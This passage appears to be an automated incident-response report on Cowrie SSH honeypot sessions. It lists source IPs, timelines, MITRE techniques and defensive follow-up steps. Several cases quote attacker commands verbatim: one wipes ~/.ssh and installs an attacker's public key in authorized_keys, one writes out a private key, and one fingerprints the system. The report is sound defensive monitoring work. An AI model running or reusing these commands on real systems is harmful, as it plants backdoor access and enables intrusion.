| **Last Seen** | 2026-10-23 02:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 02:48:32` | `cowrie.session.connect` |
| `2026-10-23 02:48:32` | `cowrie.client.version` |
| `2026-10-23 02:48:32` | `cowrie.client.kex` |
| `2026-10-23 02:48:32` | `cowrie.login.success` |
| `2026-10-23 02:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.1.237[.]197` to AbuseIPDB if not already reported
- [ ] Block `166.1.237[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e45cd10e1ee7

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-10-23 02:48 |
| **Last Seen** | 2026-10-23 02:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 02:48:33` | `cowrie.session.connect` |
| `2026-10-23 02:48:33` | `cowrie.client.version` |
| `2026-10-23 02:48:33` | `cowrie.client.kex` |
| `2026-10-23 02:48:33` | `cowrie.login.success` |
| `2026-10-23 02:48:35` | `cowrie.session.params` |
| `2026-10-23 02:48:35` | `cowrie.command.input` |
| `2026-10-23 02:48:35` | `cowrie.session.file_download` |
| `2026-10-23 02:48:35` | `cowrie.session.file_download` |
| `2026-10-23 02:48:35` | `cowrie.log.closed` |
| `2026-10-23 02:48:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-460b0547614a

| Field | Detail |
|---|---|
| **Source IP** | `61.72.55[.]130` |
| **First Seen** | 2026-10-23 02:57 |
| **Last Seen** | 2026-10-23 02:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 02:57:40` | `cowrie.session.connect` |
| `2026-10-23 02:57:40` | `cowrie.client.version` |
| `2026-10-23 02:57:40` | `cowrie.client.kex` |
| `2026-10-23 02:57:41` | `cowrie.login.success` |
| `2026-10-23 02:57:42` | `cowrie.session.params` |
| `2026-10-23 02:57:42` | `cowrie.command.input` |
| `2026-10-23 02:57:42` | `cowrie.command.failed` |
| `2026-10-23 02:57:42` | `cowrie.log.closed` |
| `2026-10-23 02:57:43` | `cowrie.session.params` |
| `2026-10-23 02:57:43` | `cowrie.command.input` |
| `2026-10-23 02:57:43` | `cowrie.session.file_download` |
| `2026-10-23 02:57:43` | `cowrie.log.closed` |
| `2026-10-23 02:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.72.55[.]130` to AbuseIPDB if not already reported
- [ ] Block `61.72.55[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-704ad82d5776

| Field | Detail |
|---|---|
| **Source IP** | `61.72.55[.]130` |
| **First Seen** | 2026-10-23 02:57 |
| **Last Seen** | 2026-10-23 02:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 02:57:43` | `cowrie.session.connect` |
| `2026-10-23 02:57:43` | `cowrie.client.version` |
| `2026-10-23 02:57:43` | `cowrie.client.kex` |
| `2026-10-23 02:57:44` | `cowrie.login.success` |
| `2026-10-23 02:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.72.55[.]130` to AbuseIPDB if not already reported
- [ ] Block `61.72.55[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9914d5e610d2

| Field | Detail |
|---|---|
| **Source IP** | `190.66.65[.]111` |
| **First Seen** | 2026-10-23 02:57 |
| **Last Seen** | 2026-10-23 02:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 02:57:48` | `cowrie.session.connect` |
| `2026-10-23 02:57:48` | `cowrie.client.version` |
| `2026-10-23 02:57:48` | `cowrie.client.kex` |
| `2026-10-23 02:57:49` | `cowrie.login.success` |
| `2026-10-23 02:57:49` | `cowrie.session.params` |
| `2026-10-23 02:57:49` | `cowrie.command.input` |
| `2026-10-23 02:57:49` | `cowrie.command.failed` |
| `2026-10-23 02:57:50` | `cowrie.log.closed` |
| `2026-10-23 02:57:50` | `cowrie.session.params` |
| `2026-10-23 02:57:50` | `cowrie.command.input` |
| `2026-10-23 02:57:51` | `cowrie.session.file_download` |
| `2026-10-23 02:57:51` | `cowrie.log.closed` |
| `2026-10-23 02:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.66.65[.]111` to AbuseIPDB if not already reported
- [ ] Block `190.66.65[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29edaf500ef1

| Field | Detail |
|---|---|
| **Source IP** | `190.66.65[.]111` |
| **First Seen** | 2026-10-23 02:57 |
| **Last Seen** | 2026-10-23 02:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 02:57:51` | `cowrie.session.connect` |
| `2026-10-23 02:57:51` | `cowrie.client.version` |
| `2026-10-23 02:57:51` | `cowrie.client.kex` |
| `2026-10-23 02:57:51` | `cowrie.login.success` |
| `2026-10-23 02:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.66.65[.]111` to AbuseIPDB if not already reported
- [ ] Block `190.66.65[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c6ed347d7f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-10-23 03:05 |
| **Last Seen** | 2026-10-23 03:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 03:05:07` | `cowrie.session.connect` |
| `2026-10-23 03:05:07` | `cowrie.client.version` |
| `2026-10-23 03:05:07` | `cowrie.client.kex` |
| `2026-10-23 03:05:11` | `cowrie.login.success` |
| `2026-10-23 03:05:13` | `cowrie.session.params` |
| `2026-10-23 03:05:13` | `cowrie.command.input` |
| `2026-10-23 03:05:13` | `cowrie.command.input` |
| `2026-10-23 03:05:13` | `cowrie.command.input` |
| `2026-10-23 03:05:13` | `cowrie.command.input` |
| `2026-10-23 03:05:13` | `cowrie.command.input` |
| `2026-10-23 03:05:13` | `cowrie.command.success` |
| `2026-10-23 03:05:13` | `cowrie.command.input` |
| `2026-10-23 03:05:13` | `cowrie.command.input` |
| `2026-10-23 03:05:13` | `cowrie.command.input` |
| `2026-10-23 03:05:13` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4af6af7c6ebe

| Field | Detail |
|---|---|
| **Source IP** | `134.209.120[.]216` |
| **First Seen** | 2026-10-23 03:16 |
| **Last Seen** | 2026-10-23 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 03:16:17` | `cowrie.session.connect` |
| `2026-10-23 03:16:17` | `cowrie.client.version` |
| `2026-10-23 03:16:17` | `cowrie.client.kex` |
| `2026-10-23 03:16:17` | `cowrie.login.success` |
| `2026-10-23 03:16:18` | `cowrie.session.params` |
| `2026-10-23 03:16:18` | `cowrie.command.input` |
| `2026-10-23 03:16:18` | `cowrie.command.failed` |
| `2026-10-23 03:16:18` | `cowrie.log.closed` |
| `2026-10-23 03:16:19` | `cowrie.session.params` |
| `2026-10-23 03:16:19` | `cowrie.command.input` |
| `2026-10-23 03:16:19` | `cowrie.session.file_download` |
| `2026-10-23 03:16:19` | `cowrie.log.closed` |
| `2026-10-23 03:16:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.120[.]216` to AbuseIPDB if not already reported
- [ ] Block `134.209.120[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c90c97e06992

| Field | Detail |
|---|---|
| **Source IP** | `134.209.120[.]216` |
| **First Seen** | 2026-10-23 03:16 |
| **Last Seen** | 2026-10-23 03:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 03:16:19` | `cowrie.session.connect` |
| `2026-10-23 03:16:19` | `cowrie.client.version` |
| `2026-10-23 03:16:19` | `cowrie.client.kex` |
| `2026-10-23 03:16:19` | `cowrie.login.success` |
| `2026-10-23 03:16:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.120[.]216` to AbuseIPDB if not already reported
- [ ] Block `134.209.120[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d0d809b1847

| Field | Detail |
|---|---|
| **Source IP** | `182.43.235[.]75` |
| **First Seen** | 2026-10-23 03:45 |
| **Last Seen** | 2026-10-23 03:50 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 03:45:06` | `cowrie.session.connect` |
| `2026-10-23 03:45:06` | `cowrie.client.version` |
| `2026-10-23 03:45:06` | `cowrie.client.kex` |
| `2026-10-23 03:45:07` | `cowrie.login.success` |
| `2026-10-23 03:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.43.235[.]75` to AbuseIPDB if not already reported
- [ ] Block `182.43.235[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb3276cf308

| Field | Detail |
|---|---|
| **Source IP** | `43.134.85[.]158` |
| **First Seen** | 2026-10-23 03:45 |
| **Last Seen** | 2026-10-23 03:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 03:45:30` | `cowrie.session.connect` |
| `2026-10-23 03:45:30` | `cowrie.client.version` |
| `2026-10-23 03:45:30` | `cowrie.client.kex` |
| `2026-10-23 03:45:31` | `cowrie.login.success` |
| `2026-10-23 03:45:32` | `cowrie.session.params` |
| `2026-10-23 03:45:32` | `cowrie.command.input` |
| `2026-10-23 03:45:32` | `cowrie.command.failed` |
| `2026-10-23 03:45:33` | `cowrie.log.closed` |
| `2026-10-23 03:45:34` | `cowrie.session.params` |
| `2026-10-23 03:45:34` | `cowrie.command.input` |
| `2026-10-23 03:45:34` | `cowrie.session.file_download` |
| `2026-10-23 03:45:34` | `cowrie.log.closed` |
| `2026-10-23 03:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.85[.]158` to AbuseIPDB if not already reported
- [ ] Block `43.134.85[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (185) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-134956fa81b5 | HIGH | `43.134.85[.]158` | 2026-10-23 03:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-db46d09709fc | HIGH | `161.132.4[.]157` | 2026-10-23 03:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4f63389b0a05 | HIGH | `161.132.4[.]157` | 2026-10-23 03:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-72b8143a1d86 | HIGH | `202.165.25[.]206` | 2026-10-23 03:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1d6a9452902a | HIGH | `202.165.25[.]206` | 2026-10-23 03:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e4247614396e | HIGH | `182.43.235[.]75` | 2026-10-23 03:51 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-71fdd3bb7bbd | HIGH | `95.255.158[.]96` | 2026-10-23 03:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5493b7346b77 | HIGH | `95.255.158[.]96` | 2026-10-23 03:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f6f6ff3a6c2d | HIGH | `43.159.62[.]8` | 2026-10-23 03:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5a3d80f4c3c0 | HIGH | `43.159.62[.]8` | 2026-10-23 03:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2cdf5b9a1cfb | HIGH | `223.197.186[.]7` | 2026-10-23 03:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fbd5487e9a1e | HIGH | `223.197.186[.]7` | 2026-10-23 03:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fd1735fb8e0b | HIGH | `50.6.241[.]208` | 2026-10-23 03:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-15e6687c291b | HIGH | `50.6.241[.]208` | 2026-10-23 03:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b2a438bc0ed1 | HIGH | `50.6.5[.]14` | 2026-10-23 03:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4a354c52811c | HIGH | `50.6.5[.]14` | 2026-10-23 03:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e4baf6baf431 | HIGH | `123.253.162[.]254` | 2026-10-23 04:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bc6604b8d3f4 | HIGH | `123.253.162[.]254` | 2026-10-23 04:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b5869fe1d059 | HIGH | `91.229.245[.]195` | 2026-10-23 04:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a29fdd5fdfc3 | HIGH | `52.187.9[.]8` | 2026-10-23 04:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b535a5695b57 | HIGH | `130.12.180[.]51` | 2026-10-23 04:04 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-58bda55b3461 | HIGH | `52.187.9[.]8` | 2026-10-23 04:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-138abdf734c6 | HIGH | `165.154.45[.]62` | 2026-10-23 04:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-981ded290cd4 | HIGH | `165.154.45[.]62` | 2026-10-23 04:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2aec2d177c32 | HIGH | `92.118.39[.]71` | 2026-10-23 04:10 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-c932f645abf8 | HIGH | `103.172.113[.]196` | 2026-10-23 04:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9abccc7e06a1 | HIGH | `103.172.113[.]196` | 2026-10-23 04:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-028bd28dc796 | HIGH | `14.225.218[.]99` | 2026-10-23 04:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-80a643187fa9 | HIGH | `14.225.218[.]99` | 2026-10-23 04:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0ab8567c2648 | HIGH | `102.88.137[.]80` | 2026-10-23 04:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-aef7db29fd00 | HIGH | `102.88.137[.]80` | 2026-10-23 04:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d26e71fd5714 | HIGH | `179.179.195[.]143` | 2026-10-23 04:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e5a0df1e5230 | HIGH | `179.179.195[.]143` | 2026-10-23 04:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-74f9a3c06b3b | HIGH | `147.90.234[.]13` | 2026-10-23 04:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-926a78c42626 | HIGH | `147.90.234[.]13` | 2026-10-23 04:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dfef881f31db | HIGH | `52.233.193[.]61` | 2026-10-23 04:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c52f2179d6a1 | HIGH | `52.233.193[.]61` | 2026-10-23 04:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cf2b52f80ce0 | HIGH | `128.1.42[.]111` | 2026-10-23 04:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0a182e88d00b | HIGH | `128.1.42[.]111` | 2026-10-23 04:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-95c700caffc2 | HIGH | `185.225.41[.]192` | 2026-10-23 04:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-da5c3366871e | HIGH | `185.225.41[.]192` | 2026-10-23 04:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-feaf30685c80 | HIGH | `50.221.56[.]52` | 2026-10-23 04:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-519e84968f9b | HIGH | `176.53.159[.]196` | 2026-10-23 04:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d1e9e4782e94 | HIGH | `34.62.51[.]106` | 2026-10-23 04:46 | Y | 2 | 0 | `T1078` |
| IR-e7ab132b1992 | HIGH | `34.62.51[.]106` | 2026-10-23 04:46 | Y | 1 | 0 | `T1078` |
| IR-b93c39207fc5 | HIGH | `34.62.51[.]106` | 2026-10-23 04:46 | Y | 0 | 0 | `T1078` |
| IR-233b06728209 | HIGH | `207.175.192[.]136` | 2026-10-23 05:18 | Y | 2 | 0 | `T1078` |
| IR-c8e9191dc6b5 | HIGH | `207.175.192[.]136` | 2026-10-23 05:18 | Y | 1 | 0 | `T1078` |
| IR-ca507822e505 | HIGH | `207.175.192[.]136` | 2026-10-23 05:18 | Y | 0 | 0 | `T1078` |
| IR-2794b486443d | HIGH | `185.193.240[.]246` | 2026-10-23 05:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f987cdbd9fda | HIGH | `185.193.240[.]246` | 2026-10-23 05:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-888cd0230fc8 | HIGH | `80.94.95[.]118` | 2026-10-23 05:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fb25a028e0f2 | HIGH | `176.65.132[.]132` | 2026-10-23 05:57 | Y | 4 | 0 | `T1078 · T1083` |
| IR-39d23ec61e8d | HIGH | `176.53.159[.]196` | 2026-10-23 06:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5dcb1df951ff | HIGH | `92.118.39[.]71` | 2026-10-23 06:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-5b3f143525f0 | HIGH | `109.160.32[.]135` | 2026-10-23 06:03 | Y | 1 | 0 | `T1078 · T1592` |
| IR-1c4a3ae3dca5 | HIGH | `34.22.208[.]37` | 2026-10-23 06:05 | Y | 2 | 0 | `T1078` |
| IR-226bf5fa8bfa | HIGH | `34.22.208[.]37` | 2026-10-23 06:05 | Y | 1 | 0 | `T1078` |
| IR-a775ac09b854 | HIGH | `34.22.208[.]37` | 2026-10-23 06:05 | Y | 0 | 0 | `T1078` |
| IR-ace5c8dc2f48 | HIGH | `80.94.95[.]118` | 2026-10-23 06:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9d4e8a191169 | HIGH | `34.76.214[.]158` | 2026-10-23 06:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-06cdcad1a504 | HIGH | `86.53.184[.]95` | 2026-10-23 06:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c76a2511317c | HIGH | `86.53.184[.]95` | 2026-10-23 06:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ee837cff77b6 | HIGH | `41.93.82[.]201` | 2026-10-23 06:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fd221224a734 | HIGH | `41.93.82[.]201` | 2026-10-23 06:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7cf267cfc345 | HIGH | `2.57.122[.]209` | 2026-10-23 07:07 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-cee655b62c65 | HIGH | `179.62.216[.]38` | 2026-10-23 07:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2a65b20ea5cf | HIGH | `179.62.216[.]38` | 2026-10-23 07:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9cfa18858451 | HIGH | `120.48.111[.]71` | 2026-10-23 07:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-aff536acd938 | HIGH | `120.48.111[.]71` | 2026-10-23 07:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f482defca756 | HIGH | `129.121.97[.]74` | 2026-10-23 07:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1ad1ee7a1c57 | HIGH | `129.121.97[.]74` | 2026-10-23 07:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-01649f4affc0 | HIGH | `109.194.108[.]203` | 2026-10-23 07:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4ccb86464acb | HIGH | `109.194.108[.]203` | 2026-10-23 07:43 | Y | 0 | 0 | `T1078 · T1592` |
